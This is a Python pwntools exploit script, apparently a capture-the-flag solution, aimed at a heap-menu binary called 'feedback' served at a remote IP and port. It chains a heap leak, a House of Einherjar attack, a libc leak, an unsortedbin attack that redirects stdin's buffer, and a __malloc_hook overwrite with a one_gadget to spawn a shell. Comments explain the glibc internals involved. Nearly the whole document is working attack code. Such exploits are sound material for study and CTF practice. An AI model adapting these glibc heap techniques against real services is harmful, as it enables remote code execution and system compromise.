from pwn import *
import sys

HOST='18.224.70.88'
PORT=1337

context.log_level = "debug"
context.terminal = ["tmux", "splitw", "-h"]

if len(sys.argv)>1:
    r=remote(HOST,PORT)
else:
    r=process('./feedback' , env={"LD_PRELOAD":"./libc.so.6"})

libc=ELF("./libc.so.6")

def menu(opt):
    r.sendlineafter("Enter choice >> ",str(opt))

def leave_name(name,line=True):
    menu(1)
    if line:
        r.sendlineafter("Enter Name: ",name)
    else:
        r.sendafter("Enter Name: ",name)

def add_draft(title,size,feedback,line=True):
    menu(2)
    if line:
        r.sendlineafter("Enter draft title: ",title)
    else:
        r.sendafter("Enter draft title: ",title)
    r.sendlineafter("Enter size of draft: ",str(size))
    r.sendlineafter("Give your feedback: ",feedback)

def view():
    menu(3)

def create():
    menu(4)

codebase = 0x555555554000
def debug(addr):
    gdb.attach(r, "b * {}\nc".format(hex(codebase+addr)))

def save():

    ''' libc leak + unsortedbin attack '''

    #debug(0x1381)
    menu(5)
    r.sendlineafter("Enter draft id to save: ",'1')
    r.sendafter("Enter Team Name and Details: ","A"*0x350)
    r.recvuntil("Team: "+("A"*350))
    libc.address=u64(r.recvuntil('\n').strip().replace("A",'').ljust(8,'\x00'))-0x3c4b78#-0x3c1b58
    log.info("libc @ "+hex(libc.address))
    r.sendlineafter("Confirm? <y/n>: ",'n')
    r.sendafter("Enter Team Name and Details: ","A"*0x340+p64(0)+p64(0x51))
    r.sendlineafter("Confirm? <y/n>: ",'y')
    r.sendlineafter("Now give us your contact details: ",p64(0)+p64(libc.address+0x3c4910)) # unsortedbin attack
                                                            # _IO_write_end = 0x3c4910
                                                            # so here is to change _IO_buf_end=&unsortedbin
                                                            # after malloc(0x40)
                                                            # our stdin buffer is starting from stdin's _shortbuf all the way up to the pointer to top chunk
                                                            # here _IO_buf_base=0x7ffff7dd1963, _IO_buf_end=0x7ffff7dd1b78, __malloc_hook=0x7ffff7dd1b10
                                                            # so we should captcha+"\x00"+0x1a8 CHAR+one_gadget


def terminate():

    ''' overwrite malloc hook '''

    r.recvuntil("Enter this captcha code: ")
    captcha=r.recvuntil('\n').strip()
    r.sendline(captcha+'\x00'+p64(libc.address+0x3c6790)+p64(-1,signed=True)
        +p64(0)+p64(libc.address+0x3c49c0)+p64(0)*6+p64(libc.address+0x3c36e0)
        +"A"*0x150+p64(libc.address+0xf0274))

    """
    stdin is the same as before!!!
    So, where will __malloc_hook be called?
    Well, the name gets freed if the captcha is correct, but the issue is that the next chunk of name (the previously free file-structure object) has it's last bit set to null.
    Thus free assumes that name is already free and is being double freed and thus __malloc_hook is called (__malloc_hook gets called in 2 cases - either on a malloc call or on double free)
    malloc_printerr ---> __libc_message
                    |--> abort                     will call malloc
    """


def getleak():

    ''' Heap Leak '''

    add_draft("A"*32,-1,"AA",line=False)   # 0, size: 0x510
    view()
    r.recvuntil("Title: "+"A"*32)
    r.recv(8)
    heap=u64(r.recvuntil('\n').strip().ljust(8,'\x00'))-0x10
    log.info("heap @ "+hex(heap))

    ''' House of Einherjar '''

    add_draft("A",0x3c8,"B"*0x340+p64(0)+p64(0x1a1)+p64(heap+0x860)*4) # 1, house of einherjar
    add_draft("A",0x80,"A") # 2, 0x90
    leave_name("A")  # 0x90
    create()
    add_draft("A",0x100,p64(0x21)*20) # 3, use 0x21 to escape error
    leave_name("A"*128+p64(0x1a0)+'\x30',line=False)

    save()

    terminate()


if __name__=='__main__':

    getleak()
    r.interactive()